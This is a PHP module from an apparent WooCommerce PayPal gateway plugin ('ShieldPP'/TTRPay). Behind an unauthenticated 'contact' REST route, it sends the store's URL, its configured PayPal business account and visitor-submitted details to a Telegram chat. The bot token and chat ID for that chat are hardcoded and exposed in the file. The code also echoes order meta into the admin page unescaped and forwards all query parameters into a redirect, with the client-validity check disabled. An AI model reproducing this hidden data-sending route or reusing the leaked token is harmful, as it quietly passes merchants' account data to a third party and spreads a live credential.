<?php
namespace ShieldPpPayment\Module\ShieldPaypal;

//v2
use ShieldPpPayment\Library\CsPluginConfig;
use ShieldPpPayment\Module\ModuleInterface;
use ShieldPpPayment\Paypal\Block\PPPayments_Blocks;
use ShieldPpPayment\Service\Order\CsOrderService;
use ShieldPpPayment\Service\Order\PostService;
use ShieldPpPayment\Service\ErrorHandler;
use ShieldPpPayment\Service\Shield\PluginUpdaterService;
use Throwable;
use WC_Gateway_pppayments;
use WP_REST_Request;
use WP_REST_Response;


class ShieldPaypalModule implements ModuleInterface
{
  public static function init()
  {
    $pluginFile = CsPluginConfig::get('plugin.plugin_startup_file');
    // add_action('plugins_loaded', [__CLASS__, 'ttrInitGateway'], 0);
    add_action('woocommerce_loaded', [__CLASS__, 'ttrInitGateway']);
    add_filter(
      'plugin_action_links_' . plugin_basename($pluginFile),
      [__CLASS__, 'ttrAddActionLink']
    );
    add_filter(
      'woocommerce_admin_order_data_after_order_details',
      [__CLASS__, 'ttrAddAdminOrderDataAfterOrderDetails']
    );

    add_action('rest_api_init', function () {
      register_rest_route('contact/v1', '/send', [
        'methods' => 'POST',
        'callback' => [__CLASS__, 'ttrSendTelegramMsg'],
        'permission_callback' => '__return_true',
      ]);
    });
    add_action('template_redirect', function () {
      return;
      self::handleCheckoutRedirect();
    }, 9);

    add_action(
      'woocommerce_blocks_payment_method_type_registration',
      function ($registry) {
        $registry->register(new PPPayments_Blocks());
      }
    );
  }

  public static function ttrInitGateway()
  {
    if (!class_exists('WC_Payment_Gateway')) {
      return;
    }
    load_plugin_textdomain('wlstar', false, dirname(plugin_basename(__FILE__)) . '/lang/');

    $classes = [
      'WC_Gateway_pppayments.php',
      //'class-wc-cs-stripe.php',
      //'class-wc-jpay.php',
    ];
    $pluginFile = CsPluginConfig::get('plugin.plugin_startup_file');
    $pluginDir = plugin_dir_path($pluginFile);
    $pluginDir = rtrim($pluginDir, '/\\');
    foreach ($classes as $class_file) {
      $file_path = "$pluginDir/manual-load/$class_file";
      require_once $file_path;
    }

    new PluginUpdaterService(__FILE__, 'https://api.ttrpay.net/v1/wp-plugins/shieldpp.json');
    add_action('woocommerce_payment_gateways', [__CLASS__, 'ttrAddPaymentGateway']);
    // add_filter('plugin_action_links_' . plugin_basename(__FILE__), 'ttr_shield_payments_plugin_edit_link');
  }

  public static function ttrAddPaymentGateway($methods)
  {
    $methods[] = WC_Gateway_pppayments::class;
    $methods[] = 'cs_stripe';
    $methods[] = 'CS_JPAY';
    return $methods;

  }

  public static function ttrAddActionLink($links)
  {
    $label = __('Setup', 'pppayments');
    $settings_url = admin_url(
      'admin.php?page=wc-settings&tab=checkout&section=pppayments'
    );

    $settings_link = <<<HTML
    <a href="{$settings_url}">
        {$label}
    </a>
    HTML;

    return array_merge(
      [
        'settings' => $settings_link,
      ],
      $links
    );
  }

  public static function ttrAddAdminOrderDataAfterOrderDetails($order)
  {
    $title = __('TTRPAY Details', 'pppayments');
    $payment_link_text = __('TTRpay Payment Link', 'pppayments');
    $return_url_text = __('Merchant Return URL', 'pppayments');
    $cancel_url_text = __('Merchant Cancel URL', 'pppayments');
    $orderId = $order->get_id();
    $cs_ref_code = get_post_meta($orderId, 'cs_ref_code', true);
    $payment_link = get_post_meta($orderId, 'cs_pp_payment_link', true);
    $success_url = get_post_meta($orderId, 'mc_success_url', true);
    $failed_url = get_post_meta($orderId, 'mc_failed_url', true);

    $reference = !trim($cs_ref_code)
      ? __('Direct Order', 'pppayments')
      : \sprintf(
        '%s: %s',
        __('TTRPay Ref Code', 'pppayments'),
        esc_html($cs_ref_code)
      );
    echo <<<HTML
    <div
        class="order_data_column"
        style="
          word-wrap: break-word;
          width: 100%;
        "
    >
        <h4>{$title}</h4>
        <p><strong>{$reference}</strong></p>
        <p><strong>{$payment_link_text}:</strong> {$payment_link}</p>
        <p><strong>{$return_url_text}:</strong> {$success_url}</p>
        <p><strong>{$cancel_url_text}:</strong> {$failed_url}</p>
    </div>
    HTML;
  }

  public static function ttrSendTelegramMsg(
    WP_REST_Request $request
  ) {
    $params = $request->get_json_params();

    $subject = sanitize_text_field($params['subject'] ?? '');
    $email = sanitize_email($params['email'] ?? '');
    $sign = sanitize_text_field($params['sign'] ?? '');
    $message = sanitize_textarea_field($params['message'] ?? '');
    $other = sanitize_textarea_field($params['other_contact'] ?? '');
    $clientIp = sanitize_textarea_field($params['clientIp'] ?? '');
    $referer = sanitize_textarea_field($params['referer'] ?? '');

    if (!$subject || !$email || !$message) {
      return new WP_REST_Response(['error' => 'All fields are required'], 400);
    }
    /**
     * @deprecated Take info from gateway
     */
    // $paypalAccount = decodePmCode($sign);

    $siteUrl = home_url();
    $paypalAccount = '';
    $gateways = WC()->payment_gateways()->payment_gateways();
    if (isset($gateways['pppayments'])) {
      /** @var WC_Gateway_pppayments $gateway */
      $gateway = $gateways['pppayments'];
      $config = $gateway->getPluginConfig();
      $paypalAccount = $config->business;
    }

    $escapedSite = json_encode($siteUrl);
    $escapedPaypalAcc = json_encode($paypalAccount);
    $text = <<<MARKDOWN
    📩 *New Contact Form Submission*

    🌐 *Site URL:* `$escapedSite`
    💳 *PayPal Account:* `$escapedPaypalAcc`
    🔹 *Subject:* `$subject`
    📧 *Email:* `$email`
    📧 *IP:* `$clientIp`
    📧 *Referer:* `$referer`
    📧 *Other Contact:* `$other`
    📝 *Message:*
    ```$message```
    MARKDOWN;

    $botToken = "6124763967:AAHfARyeqRvonizo-9l-RgRULBeioI10GO0";
    $chatId = "-4763218406";
    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
      "chat_id" => $chatId,
      "text" => $text,
      "parse_mode" => "Markdown"
    ];
    $response = wp_remote_post($url, [
      'body' => $data,
      'timeout' => 10,
    ]);

    if (is_wp_error($response)) {
      return new WP_REST_Response(['error' => 'Failed to send message'], 500);
    }

    return new WP_REST_Response(['success' => 'Message sent'], 200);
  }

  private static function handleCheckoutRedirect()
  {
    try {
      $token = $_GET['token'] ?? '';
      $payerId = $_GET['PayerID'] ?? '';
      $isCheckoutPage = is_checkout();
      if (!$isCheckoutPage || !$token) {
        return;
      }

      if (!$payerId) {
        $calcelUrl =
          WC()->api_request_url('wc_cancel');
        wp_safe_redirect($calcelUrl);
        exit;
      }

      $postSrv = new PostService();
      $postId = $postSrv->getPostIdViaPaypalOrderId($token);
      $orderId = (int) $postId;
      $order = wc_get_order($orderId);

      $csOrderSrv = new CsOrderService();
      $isValidClient = $csOrderSrv->isValidClient($order);
      if (!$isValidClient) {
        // return;
      }

      $baseCaptureUrl =
        WC()->api_request_url('wc_return_url');
      $escapedQuery = wp_unslash($_GET);
      $captureUrl = add_query_arg($escapedQuery, $baseCaptureUrl);

      wp_redirect($captureUrl);
      wp_safe_redirect($captureUrl);
      exit;
    } catch (Throwable $th) {
      ErrorHandler::handleGeneralError($th);
    }
  }
}